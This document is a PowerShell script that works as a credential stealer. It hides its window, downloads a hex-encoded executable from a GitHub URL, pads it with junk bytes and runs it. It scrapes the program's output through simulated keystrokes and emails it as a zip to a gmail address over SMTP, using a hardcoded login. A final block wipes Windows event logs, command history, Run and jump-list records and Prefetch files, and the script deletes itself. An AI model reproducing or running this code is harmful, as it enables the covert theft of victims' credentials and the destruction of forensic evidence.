try {
    $v_ms = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
    $v_type = Add-Type -MemberDefinition $v_ms -Name ("W32S" + (Get-Random)) -Namespace "W3" -PassThru
    Add-Type -AssemblyName "System.IO.Compression"
    Add-Type -AssemblyName "System.IO.Compression.FileSystem"
    $v_type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

    $v_sc = ("Net.M" + "ail.Smtp" + "Client")
    $v_mm = ("Net.M" + "ail.Mail" + "Message")

    function Send-V-Mail {
        param($sb, $at)
        $u = "zqrvstef0rc5edk@zohomail.com"
        $p = "LHjzKTbzDApt" 

        try {
            $m = New-Object $v_mm
            $m.From = "Ang Mangagawa <$u>"
            $m.To.Add("srve650@gmail.com")
            $m.Subject = $sb
            $m.Body = "Ang iyong mga aanihin."
            if ($at) { $m.Attachments.Add($at) }

            $c = New-Object $v_sc("smtp.zoho.com", 587)
            $c.EnableSsl = $true
            $c.Timeout = 15000
            $c.Credentials = New-Object System.Net.NetworkCredential($u, $p)
            
            Write-Output "Sending encoded data..."
            $c.Send($m)
            Write-Output "Success!"
        }
        catch {
            Write-Output "SMTP Error: $($_.Exception.Message)"
        }
        finally {
            if ($m) { $m.Dispose() }
            if ($c) { $c.Dispose() }
        }
    }

    $u_url = ("ht" + "tps://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt")
    $r_nm = -join ((97..122) | Get-Random -Count 5 | % {[char]$_})
    $v_txt = "$env:TEMP\$r_nm.txt"
    $v_exe = "$env:TEMP\$r_nm.exe"

    Invoke-WebRequest -Uri $u_url -OutFile $v_txt

    $h_data = Get-Content $v_txt -Raw
    $b_data = [byte[]]::new($h_data.Length / 2)
    for ($i = 0; $i -lt $h_data.Length; $i += 2) {
        $b_data[$i / 2] = [convert]::ToByte($h_data.Substring($i, 2), 16)
    }

    $v_junk_size = Get-Random -Minimum 100 -Maximum 300
    $v_junk = New-Object byte[] $v_junk_size
    (New-Object System.Random).NextBytes($v_junk)
    $v_final_bytes = $b_data + $v_junk

    [System.IO.File]::WriteAllBytes($v_exe, $v_final_bytes)

    $v_p = Start-Process $v_exe -PassThru
    $v_out = "$env:TEMP\ani_$r_nm.txt"

    Start-Sleep -Seconds 2
    Add-Type -AssemblyName ("System.Win" + "dows.Forms")
    
    $ws = New-Object -ComObject WScript.Shell
    $ws.AppActivate($v_p.Id)
    Start-Sleep -Milliseconds 500

    [System.Windows.Forms.SendKeys]::SendWait("^(a)")
    Start-Sleep -Milliseconds 500
    [System.Windows.Forms.SendKeys]::SendWait("^(s)")
    Start-Sleep -Seconds 2 
    [System.Windows.Forms.SendKeys]::SendWait("$v_out")
    Start-Sleep -Milliseconds 500
    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
    Start-Sleep -Milliseconds 500

    if ($v_p) { Stop-Process -Id $v_p.Id -Force }
    
    if (Test-Path $v_out) {
        Add-Type -AssemblyName "System.IO.Compression"
        
        $r_raw = Get-Content $v_out -Raw
        $currentDate = Get-Date -Format 'yyyy-MM-dd HH:mm'
        
        $v_bytes  = [System.Text.Encoding]::UTF8.GetBytes($r_raw)
        $v_base64 = [System.Convert]::ToBase64String($v_bytes)

        $ms = New-Object System.IO.MemoryStream
        
        $zip = New-Object System.IO.Compression.ZipArchive($ms, [System.IO.Compression.ZipArchiveMode]::Create, $true)
        
        $entry = $zip.CreateEntry("anihan.txt")
        $writer = New-Object System.IO.StreamWriter($entry.Open())
        $writer.Write($v_base64)
        
        $writer.Dispose()
        $zip.Dispose()
        
        $ms.Position = 0
        
        $v_at = New-Object Net.Mail.Attachment($ms, "report_archived.zip")
        Send-V-Mail -sb "Ang pagaani sa bukirin - $currentDate" -at $v_at
        
        $v_at.Dispose()
        $ms.Dispose()
    }

    Remove-Item $v_txt, $v_exe, $v_out -Force -ErrorAction SilentlyContinue
}
catch {
    Write-Warning "Critical Error: $($_.Exception.Message)"
}

# finally {
#     try {
#         $v_logName = "Microsoft-Windows-PowerShell/Operational"
#         [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($v_logName)
#     } catch { }

#     $v_logs = @("System", "Application", "Security")
#     foreach ($v_log in $v_logs) {
#         try {
#             Clear-EventLog -LogName $v_log -ErrorAction SilentlyContinue
#         } catch { }
#     }

#     Get-ChildItem "$env:TEMP\*" -Include "*.exe","*.txt","*.zip","*.tmp" | 
#         Where-Object { $_.Name -like "*$r_nm*" -or $_.Name -like "ani_*" } | 
#         Remove-Item -Force -ErrorAction SilentlyContinue

#     $v_currentScript = $MyInvocation.MyCommand.Definition
#     if ($v_currentScript) {
#         $v_cleanupCmd = "/c timeout 3 & taskkill /F /IM powershell.exe & del `"$v_currentScript`""
#         Start-Process "cmd.exe" -ArgumentList $v_cleanupCmd -WindowStyle Hidden
#     }
# }


finally {
    try {
        $v_logName = "Microsoft-Windows-PowerShell/Operational"
        [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($v_logName)
    } catch { }

    $v_logs = @("System", "Application", "Security")
    foreach ($v_log in $v_logs) {
        try { Clear-EventLog -LogName $v_log -ErrorAction SilentlyContinue } catch { }
    }

    $v_runRegistry = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    if (Test-Path $v_runRegistry) {
        Remove-ItemProperty -Path $v_runRegistry -Name * -ErrorAction SilentlyContinue
    }

    try {
        $v_hPath = (Get-PSReadlineOption).HistorySavePath
        if (Test-Path $v_hPath) { Clear-Content $v_hPath -Force }
    } catch { }

    $v_jumpList = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
    if (Test-Path $v_jumpList) {
        Get-ChildItem $v_jumpList -Filter "*.automaticDestinations-ms" | Remove-Item -Force -ErrorAction SilentlyContinue
    }

    Get-ChildItem "$env:TEMP\*" -Include "*.exe","*.txt","*.zip","*.tmp" | 
        Where-Object { $_.Name -like "*$r_nm*" -or $_.Name -like "ani_*" } | 
        Remove-Item -Force -ErrorAction SilentlyContinue

    Clear-History -ErrorAction SilentlyContinue

    $v_currentScript = $MyInvocation.MyCommand.Definition
    if ($v_currentScript) {
        $v_cleanupCmd = "/c timeout 3 & taskkill /F /IM powershell.exe & del `"$v_currentScript`""
        Start-Process "cmd.exe" -ArgumentList $v_cleanupCmd -WindowStyle Hidden
    }

    try {
        $v_prefetchPath = "$env:SystemRoot\Prefetch"
        if (Test-Path $v_prefetchPath) {
            Get-ChildItem -Path $v_prefetchPath -Filter "*$r_nm*.pf" | 
                Remove-Item -Force -ErrorAction SilentlyContinue
            
            Get-ChildItem -Path $v_prefetchPath -Filter "POWERSHELL.EXE*.pf" | 
                Remove-Item -Force -ErrorAction SilentlyContinue
        }
    } catch { }
}